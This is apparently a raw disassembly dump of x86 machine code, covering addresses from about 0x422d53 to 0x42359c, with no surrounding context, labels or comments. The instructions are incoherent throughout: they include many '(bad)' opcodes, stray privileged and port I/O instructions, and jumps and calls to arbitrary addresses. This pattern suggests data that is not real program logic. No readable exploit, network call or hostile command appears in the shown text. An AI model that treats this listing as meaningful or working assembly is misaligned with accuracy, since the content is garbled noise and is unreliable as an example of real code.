  422d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d54:	stos   BYTE PTR es:[edi],al
  422d55:	dec    ebx
  422d56:	lock vpaddusw ymm4,ymm1,YMMWORD PTR cs:[ecx-0x33]
  422d5d:	push   edi
  422d5e:	stos   DWORD PTR es:[edi],eax
  422d5f:	ja     0x422d19
  422d61:	call   0xfacb8e56
  422d66:	(bad)  
  422d67:	xchg   edx,eax
  422d68:	imul   BYTE PTR [ebx+0x49]
  422d6b:	and    esi,ebx
  422d6d:	jmp    0x56c763e8
  422d72:	jo     0x422d48
  422d74:	and    DWORD PTR [ebx+0x10da81dc],0x38ed20a7
  422d7e:	pop    esi
  422d7f:	mov    ebx,0x1c134d5d
  422d84:	icebp  
  422d85:	push   cs
  422d86:	fimul  DWORD PTR [edi]
  422d88:	jg     0x422d2c
  422d8a:	add    bh,BYTE PTR [edx-0x2695fc00]
  422d90:	popa   
  422d91:	jnp    0x422d31
  422d93:	popf   
  422d94:	sub    BYTE PTR [ebx],cl
  422d96:	(bad)  
  422d97:	repz mov WORD PTR [eax+0x783dae44],gs
  422d9e:	push   0xffffffb1
  422da0:	add    al,ch
  422da2:	jne    0x422de1
  422da4:	pop    ebx
  422da5:	jl     0x422dcb
  422da7:	iret   
  422da8:	sahf   
  422da9:	or     BYTE PTR [ebp-0x6b],ah
  422dac:	mov    esi,0xb2165b80
  422db1:	ja     0x422d4c
  422db3:	retf   0x5d91
  422db6:	sub    edi,eax
  422db8:	hlt    
  422db9:	mov    eax,ds:0xc5251c56
  422dbe:	pop    ds
  422dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422dc0:	mov    DWORD PTR [ebx+0x4f1a306],edx
  422dc6:	test   al,0xe6
  422dc8:	shr    DWORD PTR [eax+0x1d],cl
  422dcb:	jl     0x422d58
  422dcd:	int3   
  422dce:	rcl    DWORD PTR [ebx+0x399efb05],cl
  422dd4:	sbb    bh,BYTE PTR [ebx+0x67fe5fc4]
  422dda:	xor    esp,DWORD PTR [ecx-0x65]
  422ddd:	xchg   BYTE PTR [ecx],dl
  422ddf:	xor    ah,BYTE PTR [edx]
  422de1:	push   ss
  422de2:	sbb    al,0xad
  422de4:	jns    0x422e5b
  422de6:	jne    0x422dcd
  422de8:	cmp    eax,0x68213783
  422ded:	dec    eax
  422dee:	call   0xf78c3002
  422df3:	loopne 0x422db4
  422df5:	dec    esi
  422df6:	cmp    ebx,DWORD PTR [eax-0x4ae0d186]
  422dfc:	cmp    eax,edx
  422dfe:	lods   al,BYTE PTR ds:[esi]
  422dff:	add    edi,DWORD PTR [ecx+0x5f2fe4dd]
  422e05:	shr    DWORD PTR [edx-0x6aa45d5b],0x2f
  422e0c:	in     eax,dx
  422e0d:	popf   
  422e0e:	ficom  DWORD PTR [ebx-0x22]
  422e11:	icebp  
  422e12:	sbb    eax,0x67d5bb2b
  422e17:	in     eax,dx
  422e18:	mov    ebx,0xf4e2b247
  422e1d:	repnz ins DWORD PTR es:[edi],dx
  422e1f:	pop    ebp
  422e20:	int    0x7d
  422e22:	pop    esi
  422e23:	push   edx
  422e24:	inc    esp
  422e25:	and    eax,0xd119a47d
  422e2a:	push   0xc4231435
  422e2f:	in     al,dx
  422e30:	xor    bl,0x19
  422e33:	cmp    BYTE PTR fs:[edx-0x3d83f892],bl
  422e3a:	cmp    edx,DWORD PTR ds:0x8e3bf9a1
  422e40:	push   es
  422e41:	loop   0x422e23
  422e43:	push   eax
  422e44:	mov    eax,0xbd0874b0
  422e49:	hlt    
  422e4a:	lods   al,BYTE PTR ds:[esi]
  422e4b:	pop    edx
  422e4c:	retf   0x832f
  422e4f:	inc    edi
  422e50:	mov    esi,0xdda1d91d
  422e55:	(bad)  
  422e56:	call   0x5af707a5
  422e5b:	inc    ebp
  422e5c:	mov    ds:0x278fb791,al
  422e61:	repz push cs
  422e63:	add    edx,DWORD PTR [eax+0x7c]
  422e66:	clc    
  422e67:	sub    bl,bh
  422e69:	(bad)  
  422e6a:	fsub   st,st(1)
  422e6c:	pop    ecx
  422e6d:	mov    cl,0xbc
  422e6f:	pushf  
  422e70:	retf   0xeb1e
  422e73:	je     0x422ed9
  422e75:	mov    esp,0x18800bf2
  422e7a:	dec    edx
  422e7b:	std    
  422e7c:	inc    eax
  422e7d:	out    0x35,eax
  422e7f:	test   DWORD PTR [ecx],ebp
  422e81:	out    dx,eax
  422e82:	xor    eax,0x458dc41d
  422e87:	sbb    BYTE PTR [ecx],0xab
  422e8a:	retf   
  422e8b:	push   ebx
  422e8c:	cdq    
  422e8d:	je     0x422e83
  422e8f:	les    esp,FWORD PTR [ebx+0x35]
  422e92:	ret    
  422e93:	pop    ss
  422e94:	mul    eax
  422e96:	pop    esp
  422e97:	std    
  422e98:	mov    cl,0xcf
  422e9a:	or     dh,BYTE PTR [edi+0x5a]
  422e9d:	outs   dx,BYTE PTR ds:[esi]
  422e9e:	cmp    DWORD PTR [edx-0x1eea1dcb],ebx
  422ea4:	pop    es
  422ea5:	xor    al,0x23
  422ea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ea8:	pop    ebx
  422ea9:	and    DWORD PTR [eax+ecx*2],ebx
  422eac:	sbb    ch,BYTE PTR [eax+0x4cc1da08]
  422eb2:	mov    eax,0x1226b854
  422eb7:	sbb    eax,0x44da040
  422ebc:	in     eax,dx
  422ebd:	sahf   
  422ebe:	cmp    BYTE PTR [ecx+0x11],bl
  422ec1:	out    dx,eax
  422ec2:	in     al,0xae
  422ec4:	sub    esi,DWORD PTR [ebx]
  422ec6:	mov    al,ds:0x399ecb9c
  422ecb:	pop    edx
  422ecc:	lahf   
  422ecd:	push   0x4
  422ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ed0:	push   ebx
  422ed1:	ja     0x422f48
  422ed3:	and    DWORD PTR [ebp-0x45b423de],0xfffffff2
  422eda:	ror    bh,cl
  422edc:	xchg   edx,eax
  422edd:	popa   
  422ede:	(bad)  [ecx+0x69]
  422ee1:	lock dec edi
  422ee3:	mov    al,ds:0x840b18e7
  422ee8:	pushf  
  422ee9:	pop    ds
  422eea:	repnz push ebp
  422eec:	retf   
  422eed:	popf   
  422eee:	leave  
  422eef:	int3   
  422ef0:	sub    al,dh
  422ef2:	and    BYTE PTR [edx+esi*2],cl
  422ef5:	or     bh,BYTE PTR [ecx+eiz*1+0x51c11f97]
  422efc:	fild   QWORD PTR [edx+edx*1+0x5a3f7cb3]
  422f03:	add    ebx,DWORD PTR [edx-0x23]
  422f06:	dec    esp
  422f07:	cdq    
  422f08:	sub    bl,BYTE PTR [ebp-0x1b]
  422f0b:	add    eax,0x7a0c315a
  422f10:	ins    BYTE PTR es:[edi],dx
  422f11:	xchg   ebp,eax
  422f12:	and    BYTE PTR [ebp-0x27],bh
  422f15:	inc    ebp
  422f16:	mov    BYTE PTR [ecx+0x61262a59],dh
  422f1c:	cmp    eax,DWORD PTR [eax+edi*8]
  422f1f:	cs leave 
  422f21:	dec    eax
  422f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f23:	call   0xac1d5d1f
  422f28:	loop   0x422f1d
  422f2a:	fs jae 0x422ed4
  422f2d:	jae    0x422eef
  422f2f:	mov    ch,0x23
  422f31:	cmc    
  422f32:	clc    
  422f33:	dec    esp
  422f34:	shl    esi,1
  422f36:	outs   dx,BYTE PTR ds:[esi]
  422f37:	xlat   BYTE PTR ds:[ebx]
  422f38:	mov    edi,0x2ee960ed
  422f3d:	mov    al,0x76
  422f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f40:	out    dx,eax
  422f41:	push   edi
  422f42:	push   ecx
  422f43:	mov    bh,BYTE PTR [ebp+edx*2-0x69b5aa5c]
  422f4a:	and    al,0xd8
  422f4c:	push   ecx
  422f4d:	and    BYTE PTR [esi],ah
  422f4f:	jb     0x422f79
  422f51:	adc    BYTE PTR [esi-0x7c05bae4],0xe0
  422f58:	inc    edx
  422f59:	pop    edx
  422f5a:	out    0x88,al
  422f5c:	cmc    
  422f5d:	and    dl,bl
  422f5f:	jl     0x422f34
  422f61:	repz pop ecx
  422f63:	xchg   edx,eax
  422f64:	das    
  422f65:	xor    dh,ah
  422f67:	in     al,dx
  422f68:	jno    0x422f77
  422f6a:	add    eax,0xe790913
  422f6f:	xchg   esi,eax
  422f70:	or     ebx,esi
  422f72:	push   0xa14e6c17
  422f77:	add    dl,BYTE PTR [esi+0x3]
  422f7a:	mov    eax,ds:0xd95520c6
  422f7f:	jmp    0x97173b16
  422f84:	push   es
  422f85:	sbb    ah,BYTE PTR [ecx+0x37]
  422f88:	mov    DWORD PTR [esi+0x558c9d0d],esp
  422f8e:	hlt    
  422f8f:	jmp    0x5db0:0x79cdfcf7
  422f96:	pop    esi
  422f97:	mov    ah,0xba
  422f99:	loopne 0x422ff9
  422f9b:	sbb    esp,DWORD PTR [ecx-0xd2a3ad2]
  422fa1:	in     eax,0x91
  422fa3:	or     BYTE PTR [eax+ebp*2],al
  422fa6:	stos   DWORD PTR es:[di],eax
  422fa8:	cli    
  422fa9:	ficomp WORD PTR [eax-0xdf74cde]
  422faf:	ror    BYTE PTR [edx+0x14],cl
  422fb2:	test   al,0x5f
  422fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fb5:	jae    0x422fab
  422fb7:	icebp  
  422fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fb9:	lahf   
  422fba:	add    cl,0x8c
  422fbd:	xchg   edi,eax
  422fbe:	test   DWORD PTR [edx],esi
  422fc0:	scas   al,BYTE PTR es:[edi]
  422fc1:	inc    eax
  422fc2:	adc    BYTE PTR [eax],dh
  422fc4:	pushf  
  422fc5:	cwde   
  422fc6:	sbb    DWORD PTR [edi+0x44],0x44
  422fca:	pop    ds
  422fcb:	cmp    edi,DWORD PTR [ebp-0x404fb635]
  422fd1:	mov    ds:0xa36ed21f,al
  422fd6:	sub    ebp,0x4f
  422fd9:	ror    BYTE PTR [eax-0xa47e95d],cl
  422fdf:	jno    0x422fa9
  422fe1:	mov    ds:0xa818ce6b,al
  422fe6:	test   al,0x95
  422fe8:	and    DWORD PTR [ebx+0xf],esp
  422feb:	adc    ecx,DWORD PTR [edx+0x79b20f2b]
  422ff1:	inc    edi
  422ff2:	enter  0xf991,0x7f
  422ff6:	sar    BYTE PTR [ecx],cl
  422ff8:	or     dh,ah
  422ffa:	adc    ebp,DWORD PTR [ebx+ebx*8]
  422ffd:	mov    esp,0xcd2f3f86
  423002:	xchg   BYTE PTR ds:0xa5e20cac,ah
  423008:	stc    
  423009:	sbb    cl,BYTE PTR [edx]
  42300b:	pop    edx
  42300c:	sbb    dl,dl
  42300e:	push   ecx
  42300f:	scas   al,BYTE PTR es:[edi]
  423010:	data16 fwait
  423012:	mov    ebp,0xc0f5f2be
  423017:	push   es
  423018:	das    
  423019:	lods   al,BYTE PTR ds:[esi]
  42301a:	sub    DWORD PTR [ebp+0x5c20bc7e],ebp
  423020:	sub    BYTE PTR [edi-0x22],dh
  423023:	ins    BYTE PTR es:[edi],dx
  423024:	das    
  423025:	cs inc esp
  423027:	retf   
  423028:	xchg   edi,eax
  423029:	jne    0x423040
  42302b:	ss or  al,0x30
  42302e:	push   eax
  42302f:	(bad)  
  423031:	test   al,0xe
  423033:	xchg   ecx,eax
  423034:	fmulp  st(4),st
  423036:	jl     0x423004
  423038:	or     edi,eax
  42303a:	mov    bh,0xc1
  42303c:	scas   al,BYTE PTR es:[edi]
  42303d:	inc    ebp
  42303e:	je     0x422ff4
  423040:	(bad)
  423043:	out    dx,eax
  423044:	push   edx
  423045:	into   
  423046:	dec    esi
  423047:	xchg   ecx,eax
  423048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423049:	mov    BYTE PTR [ebp+0x57],ah
  42304c:	adc    eax,0x64b9e626
  423051:	pop    ebx
  423052:	shl    dl,0x9
  423055:	stc    
  423056:	scas   al,BYTE PTR es:[edi]
  423057:	mov    dl,0xec
  423059:	add    eax,esp
  42305b:	retf   
  42305c:	xlat   BYTE PTR ds:[ebx]
  42305d:	xor    BYTE PTR ds:0x9797842c,0xe
  423064:	and    BYTE PTR [edx],bh
  423066:	clc    
  423067:	adc    ebx,0x227d6f22
  42306d:	and    eax,0x3e9d7d5
  423072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423073:	mov    esp,0x3f76b177
  423078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423079:	pop    edx
  42307a:	pop    ebp
  42307b:	mov    ds:0xa5b786bf,eax
  423080:	fld    DWORD PTR [edi+ebp*2+0x113ba445]
  423087:	fsub   QWORD PTR [edi+0x1f44f1e9]
  42308d:	mov    dh,0xef
  42308f:	adc    al,0xd5
  423091:	pop    esp
  423092:	and    edi,0x1c
  423095:	gs pop ebp
  423097:	add    ebp,edi
  423099:	dec    ebp
  42309a:	push   0x2
  42309c:	xchg   edi,eax
  42309d:	xchg   esp,eax
  42309e:	sahf   
  42309f:	test   al,0x46
  4230a1:	cmp    eax,edi
  4230a3:	cwde   
  4230a4:	and    esp,DWORD PTR [eax+0x30f5f0d0]
  4230aa:	mov    eax,0x8533b672
  4230af:	out    0xc1,eax
  4230b1:	fndisi(8087 only) 
  4230b3:	mov    al,ah
  4230b5:	scas   eax,DWORD PTR es:[edi]
  4230b6:	or     eax,0xe207204
  4230bb:	(bad)  [eax+0x26]
  4230be:	pop    esp
  4230bf:	sbb    BYTE PTR [esi-0xec88c0d],dl
  4230c5:	jp     0x4230d3
  4230c7:	pop    ss
  4230c8:	push   0x4fe64491
  4230cd:	or     eax,0x3b8f6e42
  4230d2:	push   ds
  4230d3:	xor    BYTE PTR fs:[ecx+eax*8],cl
  4230d7:	arpl   WORD PTR [eax],di
  4230d9:	lods   al,BYTE PTR ds:[esi]
  4230da:	das    
  4230db:	push   edx
  4230dc:	rcr    DWORD PTR [eax+0x45],0x3e
  4230e0:	and    esi,DWORD PTR [edi-0x7d]
  4230e3:	fmul   QWORD PTR [eax]
  4230e5:	daa    
  4230e6:	xchg   ecx,eax
  4230e7:	dec    edi
  4230e8:	push   ebx
  4230e9:	sbb    ch,BYTE PTR [ebx-0x1d8319e7]
  4230ef:	data16 fdiv QWORD PTR [ebp-0x65e4799b]
  4230f6:	xchg   ebx,eax
  4230f7:	fnstcw WORD PTR [eax+0x6a]
  4230fa:	mov    ecx,0x6af4d7ad
  4230ff:	or     DWORD PTR [ebx+0xf],edx
  423102:	lods   eax,DWORD PTR ds:[esi]
  423103:	rcr    DWORD PTR [ebx-0xe293435],0x5c
  42310a:	xor    ecx,DWORD PTR [ebx-0x1f]
  42310d:	mov    al,0xcc
  42310f:	leave  
  423110:	adc    dl,BYTE PTR [eax]
  423112:	xchg   esi,eax
  423113:	mov    bh,0x57
  423115:	repnz in al,0x95
  423118:	fstp   st(2)
  42311a:	js     0x423123
  42311c:	dec    eax
  42311d:	sub    al,0xf8
  42311f:	jecxz  0x4230e2
  423121:	inc    esi
  423122:	pop    esi
  423123:	pop    ecx
  423124:	mov    eax,0xa804e3da
  423129:	sub    edi,ebx
  42312b:	sbb    eax,0xb57c4c27
  423130:	dec    ecx
  423131:	(bad)  
  423133:	stos   DWORD PTR es:[edi],eax
  423134:	mov    ah,0x9b
  423136:	xchg   edi,eax
  423137:	scas   al,BYTE PTR es:[edi]
  423138:	push   0xffffffee
  42313a:	ins    DWORD PTR es:[edi],dx
  42313b:	inc    esi
  42313c:	aam    0x4b
  42313e:	int    0x84
  423140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423141:	(bad)  
  423143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423144:	xchg   esp,eax
  423145:	int3   
  423146:	mov    ds:0x8535c5fd,al
  42314b:	or     BYTE PTR [ecx+esi*1+0x3],0xb3
  423150:	mov    bh,0x44
  423152:	dec    ebp
  423153:	(bad)  
  423154:	sbb    al,0xbc
  423156:	repz shr DWORD PTR [ebx-0x5a34f815],0x6c
  42315e:	jae    0x4230eb
  423160:	ss or  eax,0xf39bfb69
  423166:	dec    esp
  423167:	adc    eax,ecx
  423169:	out    dx,eax
  42316a:	sbb    BYTE PTR [ebx+0x1cd252d5],dh
  423170:	sbb    BYTE PTR [eax-0x3e],bh
  423173:	inc    esi
  423174:	repz jb 0x423198
  423177:	and    DWORD PTR [ecx-0x43],eax
  42317a:	les    edi,FWORD PTR ds:0x6ea0b6e0
  423180:	ss scas al,BYTE PTR es:[edi]
  423182:	xchg   ecx,eax
  423183:	mov    ch,0x6c
  423185:	pop    ecx
  423186:	mov    esi,0x1f94da01
  42318b:	in     eax,dx
  42318c:	stos   BYTE PTR es:[edi],al
  42318d:	xchg   edx,eax
  42318e:	sbb    al,0x6
  423190:	ds push es
  423192:	out    0x44,al
  423194:	mov    esp,0xfe840140
  423199:	mov    ds:0xdd24c9cd,eax
  42319e:	sub    BYTE PTR [ebp-0x15f24090],dl
  4231a4:	inc    esi
  4231a5:	imul   ebx,DWORD PTR [edx],0x93610e6c
  4231ab:	imul   edx,DWORD PTR [esi+esi*8+0x33],0xfffffffc
  4231b0:	addr16 jmp 0x856b:0x37664e98
  4231b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231b9:	cdq    
  4231ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231bb:	mov    ecx,0xeaf469f2
  4231c0:	dec    esi
  4231c1:	cli    
  4231c2:	out    dx,al
  4231c3:	in     eax,dx
  4231c4:	aas    
  4231c5:	add    esi,DWORD PTR cs:[ecx-0x3f78ecbf]
  4231cc:	dec    ebx
  4231cd:	jne    0x42318c
  4231cf:	jecxz  0x423243
  4231d1:	pop    ds
  4231d2:	fs push es
  4231d4:	mov    ds,WORD PTR ds:0x9db93c5a
  4231da:	pop    edi
  4231db:	jg     0x423184
  4231dd:	adc    BYTE PTR [eax],cl
  4231df:	jp     0x423220
  4231e1:	mov    ds:0x31b0365d,eax
  4231e6:	aam    0x78
  4231e8:	xchg   ecx,eax
  4231e9:	mov    esp,0x6907168d
  4231ee:	out    0xa,eax
  4231f0:	and    BYTE PTR [edx],bl
  4231f2:	popf   
  4231f3:	mov    dh,0x8e
  4231f5:	test   al,0xae
  4231f7:	dec    eax
  4231f8:	hlt    
  4231f9:	outs   dx,BYTE PTR ds:[esi]
  4231fa:	jno    0x4231ca
  4231fc:	push   edi
  4231fd:	add    al,0x38
  4231ff:	test   BYTE PTR [eax+ebx*4-0x5922effa],bl
  423206:	into   
  423207:	dec    esi
  423208:	test   ah,al
  42320a:	jp     0x4231d1
  42320c:	outs   dx,BYTE PTR ds:[esi]
  42320d:	xor    al,0xf
  42320f:	out    dx,al
  423210:	cmp    ch,cl
  423212:	retf   
  423213:	int    0x29
  423215:	pop    ss
  423216:	lds    eax,FWORD PTR [esi]
  423218:	out    0xaf,al
  42321a:	sub    edx,edx
  42321c:	xor    edx,edx
  42321e:	mov    eax,ss:0x7b32f4fb
  423224:	jno    0x4232a2
  423226:	fisttp DWORD PTR [edi+0x7281d908]
  42322c:	fldcw  WORD PTR [edi+0x4740cc54]
  423232:	xor    DWORD PTR [ecx+0x3b],esi
  423235:	jmp    0x402f:0xad5cb169
  42323c:	cdq    
  42323d:	icebp  
  42323e:	push   0x46
  423240:	call   0x56c8e61c
  423245:	sub    eax,edi
  423247:	ds ss inc eax
  42324a:	dec    ebx
  42324b:	cmc    
  42324c:	hlt    
  42324d:	repnz inc eax
  42324f:	loop   0x42325c
  423251:	xor    al,0x70
  423253:	jmp    0x4231f1
  423255:	add    eax,0xa80dfa9d
  42325a:	mov    al,0xd7
  42325c:	xchg   edx,eax
  42325d:	xchg   esi,eax
  42325e:	std    
  42325f:	lahf   
  423260:	sbb    eax,0x617034ad
  423265:	fiadd  DWORD PTR [edx-0x289fe053]
  42326b:	and    eax,edx
  42326d:	fmulp  st(2),st
  42326f:	stc    
  423270:	jmp    0x51260b8
  423275:	push   eax
  423276:	dec    esi
  423277:	std    
  423278:	jecxz  0x4232d0
  42327a:	jno    0x42322b
  42327c:	xor    al,0x8f
  42327e:	adc    BYTE PTR [ecx+0x639cfa0d],ch
  423284:	pop    esi
  423285:	ret    
  423286:	shl    BYTE PTR [edi+0x32145f5f],0x53
  42328d:	arpl   WORD PTR ds:0xc151e6aa,sp
  423293:	(bad)  
  423294:	push   0x3f58fbc5
  423299:	ds jno 0x423278
  42329c:	mov    dh,0x3a
  42329e:	loop   0x42325c
  4232a0:	(bad)  
  4232a1:	call   0x3910:0xd145a68f
  4232a8:	pop    ebp
  4232a9:	sub    ah,BYTE PTR [edi+0x5f]
  4232ac:	cdq    
  4232ad:	add    DWORD PTR [esi+edx*2+0x376c62e8],edx
  4232b4:	or     esi,esp
  4232b6:	retf   
  4232b7:	mov    ebp,0xb2fd4bd6
  4232bc:	dec    ebx
  4232bd:	pusha  
  4232be:	div    DWORD PTR [edx+0x59]
  4232c1:	inc    edi
  4232c2:	or     BYTE PTR [edx+eiz*2-0x274d2648],bl
  4232c9:	popa   
  4232ca:	xchg   ecx,eax
  4232cb:	or     ebp,esi
  4232cd:	lock pop esi
  4232cf:	test   DWORD PTR [esi-0x5cea871],0x13f39ed4
  4232d9:	into   
  4232da:	mov    ebx,0xddb0e1e8
  4232df:	aaa    
  4232e0:	cs ins BYTE PTR es:[edi],dx
  4232e2:	ror    DWORD PTR [ecx+0x8],0x38
  4232e6:	dec    edi
  4232e7:	outs   dx,DWORD PTR ds:[esi]
  4232e8:	add    al,0x82
  4232ea:	inc    ebx
  4232eb:	mov    ch,0xfd
  4232ed:	lods   al,BYTE PTR ds:[esi]
  4232ee:	mov    BYTE PTR [esi-0x46],ch
  4232f1:	mov    ebx,0x24dba0ab
  4232f6:	mov    ebp,0x96dffc72
  4232fb:	xchg   ebp,eax
  4232fc:	cmp    ebx,DWORD PTR [esp+eax*8]
  4232ff:	adc    DWORD PTR [esi-0x14af8b6d],ebp
  423305:	push   esi
  423306:	mov    cl,0x4b
  423308:	fsubr  st,st(0)
  42330a:	mov    ch,0xfb
  42330c:	in     eax,0x51
  42330e:	jb     0x42334e
  423310:	add    dl,al
  423312:	mov    dl,0x2a
  423314:	pushf  
  423315:	jns    0x4232cf
  423317:	or     DWORD PTR [edx+0x4056a91b],edx
  42331d:	push   esi
  42331e:	mov    ch,0x0
  423320:	mov    edx,0x433c99ca
  423325:	or     ecx,DWORD PTR [edi+0x1f]
  423328:	xor    DWORD PTR [ebx+0x1ccf2c81],eax
  42332e:	into   
  42332f:	mov    bh,0x88
  423331:	xchg   ebx,eax
  423332:	xor    al,0x59
  423334:	sub    DWORD PTR [ecx],ebp
  423336:	(bad)  
  423337:	mov    edx,0x29e377c4
  42333c:	sbb    eax,0x6f8b08c7
  423341:	mov    cl,0x62
  423343:	bound  ebx,QWORD PTR [eax]
  423345:	das    
  423346:	repnz enter 0x3ec3,0x72
  42334b:	push   edx
  42334c:	test   BYTE PTR [edi+0x12],ah
  42334f:	mov    ds:0x2841b8f0,eax
  423354:	scas   al,BYTE PTR es:[edi]
  423355:	loop   0x4233c7
  423357:	hlt    
  423358:	mov    ds:0x336dd101,al
  42335d:	xchg   esi,eax
  42335e:	rol    BYTE PTR [edi-0x26a18813],0x9d
  423365:	lahf   
  423366:	mov    bl,0x32
  423368:	jmp    0x4b7e22ea
  42336d:	inc    ebx
  42336e:	xor    al,BYTE PTR [ebx-0x187a0845]
  423374:	push   ss
  423375:	out    dx,al
  423376:	push   ebp
  423377:	push   eax
  423378:	fwait
  423379:	out    dx,al
  42337a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42337b:	cdq    
  42337c:	lods   eax,DWORD PTR ds:[esi]
  42337d:	add    BYTE PTR [esp+ebx*2+0x51fc17c1],0xa2
  423385:	push   edi
  423386:	add    DWORD PTR [esi],eax
  423388:	arpl   WORD PTR [ecx],bp
  42338a:	push   esi
  42338b:	push   ebx
  42338c:	mov    bh,0x2d
  42338e:	mov    bh,0xa0
  423390:	sub    edi,0xa110747
  423396:	cld    
  423397:	fimul  DWORD PTR ds:0x99e5480f
  42339d:	push   edi
  42339e:	mov    dh,0x18
  4233a0:	push   ss
  4233a1:	mov    BYTE PTR [ebp-0x43],0x92
  4233a5:	int    0xf7
  4233a7:	lock mov ss,ebp
  4233aa:	adc    BYTE PTR [eax],dh
  4233ac:	add    ebp,DWORD PTR [esi]
  4233ae:	push   cs
  4233af:	xor    al,0xf
  4233b1:	add    eax,0xaaaf694
  4233b6:	xor    dh,BYTE PTR [esi]
  4233b8:	jmp    0x2be75ab5
  4233bd:	push   ds
  4233be:	push   eax
  4233bf:	sub    BYTE PTR [eax],0xf9
  4233c2:	push   0x18618a3e
  4233c7:	sbb    BYTE PTR ds:0x21e6372c,dh
  4233cd:	jb     0x4233e2
  4233cf:	in     al,0x96
  4233d1:	mov    al,0x3b
  4233d3:	(bad)  
  4233d5:	add    BYTE PTR [eax+0x31b9c716],dh
  4233db:	nop
  4233dc:	bound  ebx,QWORD PTR [edi+0x3b]
  4233df:	pop    edx
  4233e0:	and    DWORD PTR [eax+0xe],ebp
  4233e3:	in     eax,dx
  4233e4:	(bad)  
  4233e5:	in     eax,dx
  4233e6:	(bad)  
  4233e7:	(bad)  
  4233e8:	push   0x11cc6665
  4233ed:	cmp    eax,0x75fa0f0
  4233f2:	into   
  4233f3:	jns    0x423466
  4233f5:	int    0x1a
  4233f7:	xchg   esi,eax
  4233f8:	int    0x83
  4233fa:	inc    esi
  4233fb:	cs jmp 0xee2d:0xb9ab79fb
  423403:	mov    bh,BYTE PTR [eax]
  423405:	repnz mul BYTE PTR [ebx]
  423408:	fs out 0x20,al
  42340b:	mov    bh,0x7b
  42340d:	and    cl,BYTE PTR [eax+0x3d]
  423410:	(bad)  
  423411:	fs (bad) 
  423413:	sub    al,0x55
  423415:	mov    DWORD PTR [edx+0x4c],0x2a55eb8a
  42341c:	imul   eax
  42341e:	stc    
  42341f:	and    eax,0xb0dc939e
  423424:	xchg   edx,eax
  423425:	adc    eax,0x65792f4a
  42342a:	shl    DWORD PTR [ebx],cl
  42342c:	lods   al,BYTE PTR ds:[esi]
  42342d:	add    ch,BYTE PTR [edx-0x7b]
  423430:	js     0x83137159
  423436:	aas    
  423437:	fiadd  DWORD PTR [si]
  42343a:	mov    bl,0xa5
  42343c:	xchg   ecx,eax
  42343d:	inc    edx
  42343e:	xchg   ecx,eax
  42343f:	cmp    BYTE PTR [edi],ah
  423441:	cmp    DWORD PTR [edx+0x59],0xd993a028
  423448:	jg     0x4233fe
  42344a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42344b:	sub    ebp,ecx
  42344d:	jnp    0x423488
  42344f:	sbb    al,0x4b
  423451:	bound  ecx,QWORD PTR [eax-0xec80ef1]
  423457:	stos   BYTE PTR es:[edi],al
  423458:	lahf   
  423459:	pop    esp
  42345a:	or     ebx,DWORD PTR [eax-0x140248db]
  423460:	mov    DWORD PTR ds:0x16ba1230,ebp
  423466:	imul   ecx,DWORD PTR ds:0x5dfd871d,0xc83371f0
  423470:	cli    
  423471:	mov    al,ds:0xfc59a900
  423476:	ret    0x337f
  423479:	mov    DWORD PTR [ecx+0x74],ebp
  42347c:	push   ebp
  42347d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42347e:	rcr    DWORD PTR [esi-0x652d2f0b],0x13
  423485:	xor    DWORD PTR [eax],0xc6af28b0
  42348b:	les    ebx,FWORD PTR [esi+edx*8+0x4088b45d]
  423492:	ss jnp 0x4234ae
  423495:	lock fsub DWORD PTR [ebp+0x0]
	...
  423514:	shr    ah,cl
  423516:	and    edx,DWORD PTR [ecx]
  423518:	aas    
  423519:	fcomip st,st(2)
  42351b:	out    dx,eax
  42351c:	or     DWORD PTR [esi+0x67e5eacd],ebp
  423522:	jo     0x4234b1
  423524:	ins    DWORD PTR es:[edi],dx
  423525:	retf   0x1
  423528:	ins    BYTE PTR es:[edi],dx
  423529:	pop    es
  42352a:	add    BYTE PTR [eax],al
  42352c:	int    0xe0
  42352e:	jle    0x423557
  423530:	(bad)  [edx+0x6baaa034]
  423536:	add    al,0x2a
  423538:	xor    ah,BYTE PTR [ecx-0x58]
  42353b:	retf   0xa686
  42353e:	jmp    0xfe68d1ec
  423543:	mov    bh,0xb1
  423545:	inc    esp
  423546:	rcl    esp,cl
  423548:	lahf   
  423549:	inc    ch
  42354b:	adc    al,0xdd
  42354d:	xor    DWORD PTR [ebp+0x4afe54be],ecx
  423553:	jge    0x4235c8
  423555:	and    al,0x35
  423557:	out    0xdd,eax
  423559:	and    bl,BYTE PTR [eax+0x7b]
  42355c:	ret    
  42355d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42355e:	cli    
  42355f:	imul   ebx,DWORD PTR [eax+0x72],0x57
  423563:	sti    
  423564:	in     eax,dx
  423565:	sahf   
  423566:	push   cs
  423567:	cld    
  423568:	sub    eax,0x52e1b005
  42356d:	cld    
  42356e:	je     0x423568
  423570:	adc    ah,BYTE PTR [edx+0x4]
  423573:	push   ebp
  423574:	call   0x118f:0x8156f70e
  42357b:	sti    
  42357c:	adc    dh,BYTE PTR [ebx-0x7d2b3425]
  423582:	inc    ebx
  423583:	lods   al,BYTE PTR ds:[esi]
  423584:	stos   BYTE PTR es:[edi],al
  423585:	enter  0xeadc,0xdc
  423589:	mov    al,ds:0x63f0833
  42358e:	sub    al,0x87
  423590:	fstp   DWORD PTR ss:[edi+0xb]
  423594:	cmp    dl,ch
  423596:	popfw  
  423598:	jb     0x42352f
  42359a:	xchg   edi,eax
  42359b:	inc    esi
  42359c:	lahf   
